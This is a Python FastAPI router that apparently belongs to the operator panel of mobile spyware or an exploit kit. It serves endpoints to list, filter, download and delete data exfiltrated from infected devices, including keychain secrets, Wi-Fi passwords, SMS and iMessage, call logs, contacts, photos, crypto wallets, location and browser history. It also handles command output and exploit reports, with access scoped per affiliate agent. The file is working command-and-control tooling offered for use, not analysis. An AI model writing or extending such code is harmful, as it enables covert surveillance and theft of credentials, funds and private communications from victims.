import json as _json
import os
from pathlib import Path
from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from sqlalchemy import desc, func, or_ as sa_or_
from datetime import datetime, timedelta
from typing import Optional, Tuple, List
from pydantic import BaseModel

from ..database import get_db, ExfilData, Device, create_audit_log
from ..auth import get_current_user
from ..wallet_parser import parse_wallet_file
from ._helpers import apply_agent_filter_exfil, apply_agent_filter_device, assert_owns_device, _resolve_agent_scope
from .settings import require_module_2fa

_PROJECT_ROOT = Path(__file__).resolve().parents[2]  # admin/routers/exfil.py → 3 levels up = project root
_EXFIL_CANDIDATE_PREFIXES = (
    "",
    "wwwroot/coruna/",
    "wwwroot\\coruna\\",
    "coruna/",
    "coruna\\",
)


def _resolve_exfil_file_path(stored_fp: str) -> Optional[str]:
    if not stored_fp:
        return None
    candidates = []
    candidates.append(stored_fp)
    candidates.append(str(_PROJECT_ROOT / stored_fp))
    norm_for = stored_fp.replace("\\", "/")
    norm_back = stored_fp.replace("/", "\\")
    for prefix in _EXFIL_CANDIDATE_PREFIXES:
        if prefix and norm_for.startswith(prefix):
            stripped_fwd = norm_for[len(prefix):]
            candidates.append(str(_PROJECT_ROOT / stripped_fwd))
        p_back = prefix.replace("/", "\\")
        if prefix and norm_back.startswith(p_back):
            stripped_back = norm_back[len(p_back):]
            candidates.append(str(_PROJECT_ROOT / stripped_back))
    exfil_dir = _PROJECT_ROOT / "exfil"
    try:
        basename = os.path.basename(norm_for)
        if basename:
            candidates.append(str(exfil_dir / basename))
            try:
                for p in exfil_dir.glob("*" + basename[-20:] if len(basename) >= 20 else basename):
                    candidates.append(str(p))
            except Exception:
                pass
    except Exception:
        pass
    try:
        uuidish = ""
        for part in norm_for.split("/"):
            if len(part) >= 16 and ("_" in part or "." in part):
                uuidish = part.split("_")[0]
                break
        if uuidish and exfil_dir.is_dir():
            for p in exfil_dir.glob(f"{uuidish}_*"):
                candidates.append(str(p))
    except Exception:
        pass
    seen = set()
    for path in candidates:
        try:
            if not path or path in seen:
                continue
            seen.add(path)
            if os.path.isfile(path):
                return os.path.abspath(path)
        except Exception:
            pass
    return None

router = APIRouter(prefix="/api/exfil", tags=["exfil"], redirect_slashes=False)

_CATEGORY_ALIASES = {
    "wallet": "wallets",
    "wallets": "wallets",
    "file": "files",
    "files": "files",
    "photo": "photos",
    "photos": "photos",
    "screenshot": "photos",
    "contact": "contacts",
    "contacts": "contacts",
    "addressbook": "contacts",
    "message": "sms",
    "sms": "sms",
    "imessage": "sms",
    "call": "calls",
    "calls": "calls",
    "calllog": "calls",
    "key": "keychain",
    "keychain": "keychain",
    "keychains": "keychain",
    "wlan": "wifi",
    "wifi": "wifi",
    "wi-fi": "wifi",
    "loc": "location",
    "location": "location",
    "gps": "location",
    "geo": "location",
    "system": "system_info",
    "system_info": "system_info",
    "sysinfo": "system_info",
    "device": "system_info",
    "device_info": "system_info",
    "info": "system_info",
    "ua": "system_info",
    "browser": "browser",
    "history": "browser",
    "safari": "browser",
    "notification": "notification",
    "notify": "notification",
    "alert": "notification",
    "custom": "custom",
    "shell": "custom",
    "command": "custom",
    "exec": "custom",
    "sandbox": "sandbox",
    "sand": "sandbox",
    "browser_profile": "sandbox",
    "indexeddb": "sandbox",
    "exploit_report": "exploit_report",
    "exploit": "exploit_report",
    "report": "exploit_report",
    "cmd_output": "command",
    "cmd": "command",
}


def _resolve_category(cat: Optional[str]) -> Tuple[Optional[str], Tuple[str, ...]]:
    if not cat:
        return None, tuple()
    c = cat.strip().lower()
    canonical = _CATEGORY_ALIASES.get(c, c)
    aliases = set()
    aliases.add(c)
    aliases.add(canonical)
    for k, v in _CATEGORY_ALIASES.items():
        if v == canonical:
            aliases.add(k)
    return canonical, tuple(aliases)


def _assert_owns_exfil(db: Session, user, exfil: ExfilData) -> None:
    if exfil is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    dev = db.query(Device).filter(Device.device_uuid == exfil.device_uuid).first()
    if not dev or dev.agent_id is None:
        raise HTTPException(status_code=403, detail="无权限访问该数据")
    if int(dev.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该数据")


@router.get("")
async def list_exfil(
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    category: Optional[str] = None,
    device_uuid: Optional[str] = None,
    search: Optional[str] = None,
    sort: Optional[str] = "uploaded_at",
    order: Optional[str] = "desc",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData)
    query = apply_agent_filter_exfil(query, db, current_user)
    if category:
        _, aliases = _resolve_category(category)
        if aliases:
            query = query.filter(ExfilData.category.in_(aliases))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid == device_uuid)
    if search and search.strip():
        like = f"%{search.strip()}%"
        query = query.filter(
            (ExfilData.description.like(like)) |
            (ExfilData.path.like(like)) |
            (ExfilData.device_uuid.like(like))
        )
    total = query.count()
    order_func = desc if (order or "desc").lower() != "asc" else None
    col = {"uploaded_at": ExfilData.uploaded_at, "file_size": ExfilData.file_size,
           "id": ExfilData.id, "category": ExfilData.category}.get((sort or "uploaded_at").lower(), ExfilData.uploaded_at)
    query = query.order_by(desc(col) if order_func else col.asc())
    items = query.offset(skip).limit(limit).all()
    result = []
    for e in items:
        d = {c.name: getattr(e, c.name) for c in e.__table__.columns}
        if isinstance(d.get("uploaded_at"), datetime):
            d["uploaded_at"] = d["uploaded_at"].isoformat()
        try:
            dev = db.query(Device).filter(Device.device_uuid == e.device_uuid).first()
            d["device_model"] = dev.device_model if dev else None
            d["device_ip"] = dev.ip if dev else None
        except Exception:
            d["device_model"] = None
            d["device_ip"] = None
        # 回退：data_json 为空时，读取 file_path 指向的 .bin 文件内容（sandbox 能力数据存于此）
        if not d.get("data_json") and d.get("file_path"):
            try:
                resolved = _resolve_exfil_file_path(d["file_path"])
                if resolved and os.path.isfile(resolved):
                    with open(resolved, "r", encoding="utf-8", errors="replace") as _f:
                        _raw = _f.read()
                    _parsed = _json.loads(_raw)
                    if isinstance(_parsed, dict):
                        for _k, _v in _parsed.items():
                            if _k not in d:
                                d[_k] = _v
            except Exception:
                pass
        result.append(d)
    return {"total": total, "items": result, "skip": skip, "limit": limit}


@router.get("/stats")
async def exfil_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    today = datetime.now().date()
    today_start = datetime.combine(today, datetime.min.time())
    base_q = apply_agent_filter_exfil(db.query(ExfilData), db, current_user)
    total = base_q.count() or 0
    total_size = base_q.with_entities(func.sum(ExfilData.file_size)).scalar() or 0
    today_count = base_q.filter(ExfilData.uploaded_at >= today_start).count() or 0
    today_size = base_q.filter(ExfilData.uploaded_at >= today_start).with_entities(func.sum(ExfilData.file_size)).scalar() or 0
    by_cat = dict(base_q.with_entities(ExfilData.category, func.count(ExfilData.id)).group_by(ExfilData.category).all())
    trend = []
    for i in range(6, -1, -1):
        d = datetime.now().date() - timedelta(days=i)
        start = datetime.combine(d, datetime.min.time())
        end = start + timedelta(days=1)
        c = base_q.filter(ExfilData.uploaded_at >= start, ExfilData.uploaded_at < end).count() or 0
        trend.append(int(c))
    return {
        "total": total, "total_size": int(total_size),
        "today_count": today_count, "today_size": int(today_size),
        "by_category": by_cat, "last_7_days": trend,
    }


def _expand_exfil_items(db, category: str, skip: int, limit: int,
                        search: Optional[str] = None, device_uuid: Optional[str] = None,
                        extra_filters: Optional[dict] = None, user=None):
    _, aliases = _resolve_category(category)
    cat_filter = ExfilData.category.in_(aliases) if aliases else (ExfilData.category == category)
    q = db.query(ExfilData).filter(cat_filter)
    if user is not None:
        q = apply_agent_filter_exfil(q, db, user)
    if device_uuid:
        q = q.filter(ExfilData.device_uuid == device_uuid)
    if search and search.strip():
        like = f"%{search.strip()}%"
        q = q.filter((ExfilData.description.like(like)) | (ExfilData.path.like(like)))
    all_rows = q.order_by(desc(ExfilData.uploaded_at)).all()
    expanded = []
    for e in all_rows:
        base = {
            "_exfil_id": e.id,
            "device_uuid": e.device_uuid,
            "path": e.path,
            "file_size": e.file_size,
            "uploaded_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
            "created_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
        }
        items_data = None
        if e.data_json:
            try:
                parsed = _json.loads(e.data_json)
                if isinstance(parsed, list):
                    items_data = parsed
                elif isinstance(parsed, dict):
                    if isinstance(parsed.get("items"), list):
                        items_data = parsed["items"]
                    elif isinstance(parsed.get("data"), list):
                        items_data = parsed["data"]
                    else:
                        items_data = [parsed]
            except Exception:
                items_data = None
        # 回退：data_json 为空时，尝试读取 file_path 指向的 .bin 文件（sandbox 能力数据存于此）
        if not items_data and e.file_path:
            try:
                resolved = _resolve_exfil_file_path(e.file_path)
                if resolved and os.path.isfile(resolved):
                    with open(resolved, "r", encoding="utf-8", errors="replace") as _f:
                        _raw = _f.read()
                    _parsed = _json.loads(_raw)
                    if isinstance(_parsed, list):
                        items_data = _parsed
                    elif isinstance(_parsed, dict):
                        if isinstance(_parsed.get("items"), list):
                            items_data = _parsed["items"]
                        elif isinstance(_parsed.get("data"), list):
                            items_data = _parsed["data"]
                        else:
                            items_data = [_parsed]
            except Exception:
                pass
        if not items_data:
            if extra_filters is None or _match_filters({}, extra_filters):
                expanded.append({**base, "_idx": 0})
            continue
        for idx, it in enumerate(items_data):
            if not isinstance(it, dict):
                try:
                    it = {"value": it}
                except Exception:
                    continue
            if extra_filters and not _match_filters(it, extra_filters):
                continue
            if search and search.strip():
                blob = " ".join(str(v) for v in it.values() if v is not None).lower()
                if search.strip().lower() not in blob:
                    continue
            row = {**base, **it, "_idx": idx, "id": f"{e.id}_{idx}"}
            if "id" not in it or not str(it.get("id", "")).isdigit():
                pass
            else:
                row["_orig_id"] = it["id"]
            expanded.append(row)
    total = len(expanded)
    page = expanded[skip: skip + limit]
    return {"total": total, "items": page, "skip": skip, "limit": limit}


def _match_filters(item: dict, filters: dict) -> bool:
    if not filters:
        return True
    for k, v in filters.items():
        if v is None or v == "":
            continue
        iv = item.get(k)
        if iv is None:
            return False
        if isinstance(v, str) and isinstance(iv, str):
            if v.lower() not in iv.lower():
                return False
        elif str(v) != str(iv):
            return False
    return True


@router.get("/keychain")
async def exfil_keychain(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    category: Optional[str] = None, service: Optional[str] = None,
    account: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    ef = {}
    if category:
        ef["category"] = category
    if service:
        ef["service"] = service
    if account:
        ef["account"] = account
    return _expand_exfil_items(db, "keychain", skip, limit, search=search,
                               device_uuid=device_uuid, extra_filters=ef or None, user=current_user)


@router.get("/wifi")
async def exfil_wifi(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    encryption: Optional[str] = None, q: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    ef = {}
    if encryption:
        ef["encryption"] = encryption
    return _expand_exfil_items(db, "wifi", skip, limit, search=search or q,
                               device_uuid=device_uuid, extra_filters=ef or None, user=current_user)


@router.get("/contacts")
async def exfil_contacts(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    q: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "contacts", skip, limit, search=search or q,
                               device_uuid=device_uuid, user=current_user)


@router.get("/sms")
async def exfil_sms(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    type: Optional[str] = None, address: Optional[str] = None, q: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    ef = {}
    if type:
        ef["type"] = type
    if address:
        ef["address"] = address
    return _expand_exfil_items(db, "sms", skip, limit, search=search or q,
                               device_uuid=device_uuid, extra_filters=ef or None, user=current_user)


@router.get("/calls")
async def exfil_calls(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    type: Optional[str] = None, number: Optional[str] = None, q: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    ef = {}
    if type:
        ef["type"] = type
    if number:
        ef["number"] = number
    return _expand_exfil_items(db, "calls", skip, limit, search=search or q,
                               device_uuid=device_uuid, extra_filters=ef or None, user=current_user)


@router.get("/photos")
async def exfil_photos(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "photos", skip, limit, search=search,
                               device_uuid=device_uuid, user=current_user)


@router.get("/files")
async def exfil_files(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "files", skip, limit, search=search,
                               device_uuid=device_uuid, user=current_user)


@router.get("/wallets")
async def exfil_wallets(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "wallets", skip, limit, search=search,
                               device_uuid=device_uuid, user=current_user)


@router.get("/location")
async def exfil_location(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "location", skip, limit, search=search,
                               device_uuid=device_uuid, user=current_user)


@router.get("/system_info")
async def exfil_system_info(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    search: Optional[str] = None, device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    return _expand_exfil_items(db, "system_info", skip, limit, search=search,
                               device_uuid=device_uuid, user=current_user)


@router.get("/{exfil_id:int}/download")
async def download_exfil(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    e = db.query(ExfilData).filter(ExfilData.id == int(exfil_id)).first()
    if not e:
        raise HTTPException(status_code=404, detail="Exfil not found")
    _assert_owns_exfil(db, current_user, e)
    stored_fp = e.file_path or ""
    fp = _resolve_exfil_file_path(stored_fp)
    if not fp or not os.path.isfile(fp):
        raise HTTPException(
            status_code=404,
            detail=f"File not found on disk (stored: {stored_fp})"
        )
    filename = os.path.basename(fp) or f"exfil_{exfil_id}"
    return FileResponse(fp, filename=filename)


@router.get("/{exfil_id:int}")
async def get_exfil(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    e = db.query(ExfilData).filter(ExfilData.id == int(exfil_id)).first()
    if not e:
        raise HTTPException(status_code=404, detail="Exfil not found")
    _assert_owns_exfil(db, current_user, e)
    d = {c.name: getattr(e, c.name) for c in e.__table__.columns}
    if isinstance(d.get("uploaded_at"), datetime):
        d["uploaded_at"] = d["uploaded_at"].isoformat()
    if d.get("data_json"):
        try:
            d["parsed_json"] = _json.loads(d["data_json"])
        except Exception:
            pass
    return d


@router.delete("/{exfil_id:int}")
async def delete_exfil(
    request: Request,
    exfil_id: int,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user),
):
    require_module_2fa(db, current_user, "exfil", otp_code)
    e = db.query(ExfilData).filter(ExfilData.id == int(exfil_id)).first()
    if not e:
        raise HTTPException(status_code=404, detail="Exfil not found")
    _assert_owns_exfil(db, current_user, e)
    fp = e.file_path
    db.delete(e)
    db.commit()
    deleted_files = 0
    if fp and os.path.exists(fp):
        try:
            os.unlink(fp)
            deleted_files = 1
        except Exception:
            pass
    username = current_user.username if current_user else "anonymous"
    try:
        create_audit_log(db, username=username, action="exfil_delete", resource_type="exfil_data",
                         resource_id=str(exfil_id),
                         detail=f"Deleted single exfil [{exfil_id}] category={e.category or ''}, device={e.device_uuid or ''}, file_deleted={deleted_files}",
                         ip_address=request.client.host if request.client else None)
    except Exception:
        pass
    return {"message": "Deleted", "deleted": 1, "file_deleted": deleted_files}


class _BatchDeleteExfilReq(BaseModel):
    ids: Optional[List[int]] = None
    all_filtered: bool = False
    category: Optional[str] = None
    device_uuid: Optional[str] = None
    search: Optional[str] = None
    start_date: Optional[str] = None
    end_date: Optional[str] = None


@router.post("/batch_delete")
async def batch_delete_exfil(
    request: Request,
    body: _BatchDeleteExfilReq,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user),
):
    require_module_2fa(db, current_user, "exfil", otp_code)
    body = body or _BatchDeleteExfilReq()
    q = db.query(ExfilData)
    q = apply_agent_filter_exfil(q, db, current_user)
    if body.category:
        canonical, aliases = _resolve_category(body.category)
        if aliases:
            q = q.filter(ExfilData.category.in_(tuple(aliases)))
        else:
            q = q.filter(ExfilData.category == body.category.strip())
    if body.device_uuid:
        q = q.filter(ExfilData.device_uuid == body.device_uuid.strip())
    if body.search:
        like = f"%{body.search.strip()}%"
        q = q.filter(sa_or_(
            ExfilData.category.ilike(like),
            ExfilData.device_uuid.ilike(like),
            ExfilData.description.ilike(like),
            ExfilData.file_path.ilike(like),
            ExfilData.path.ilike(like),
        ))
    if body.start_date:
        try:
            dt = datetime.strptime(body.start_date.strip()[:10], "%Y-%m-%d")
            q = q.filter(ExfilData.uploaded_at >= dt)
        except Exception:
            pass
    if body.end_date:
        try:
            dt = datetime.strptime(body.end_date.strip()[:10], "%Y-%m-%d") + timedelta(days=1)
            q = q.filter(ExfilData.uploaded_at < dt)
        except Exception:
            pass
    if not body.all_filtered:
        valid_ids = [int(i) for i in (body.ids or []) if i]
        if not valid_ids:
            raise HTTPException(status_code=400, detail="未选择任何数据，请勾选或开启 all_filtered=true 删除当前筛选下全部")
        q = q.filter(ExfilData.id.in_(valid_ids))
    try:
        rows = q.all()
        if not rows:
            return {"deleted": 0, "file_deleted": 0, "message": "没有可删除的数据"}
        for r in rows:
            _assert_owns_exfil(db, current_user, r)
        deleted_rows = 0
        deleted_files = 0
        for r in rows:
            fp = r.file_path
            try:
                db.delete(r)
                deleted_rows += 1
            except Exception:
                continue
            if fp and os.path.exists(fp):
                try:
                    os.unlink(fp)
                    deleted_files += 1
                except Exception:
                    pass
        db.commit()
        username = current_user.username if current_user else "anonymous"
        try:
            mode = "筛选全部" if body.all_filtered else f"选中{len(body.ids or [])}条"
            create_audit_log(db, username=username, action="exfil_batch_delete", resource_type="exfil_data",
                             resource_id="batch",
                             detail=(f"Batch deleted {deleted_rows} exfil rows ({deleted_files} files on disk); "
                                     f"mode={mode}; filter: category={body.category or ''}, device_uuid={body.device_uuid or ''}, "
                                     f"search={body.search or ''}, date={body.start_date or ''}~{body.end_date or ''}"),
                             ip_address=request.client.host if request.client else None)
        except Exception:
            pass
        return {"deleted": deleted_rows, "file_deleted": deleted_files,
                "message": f"已删除 {deleted_rows} 条记录（磁盘文件 {deleted_files} 个）"}
    except HTTPException:
        db.rollback()
        raise
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"批量删除失败: {e}")
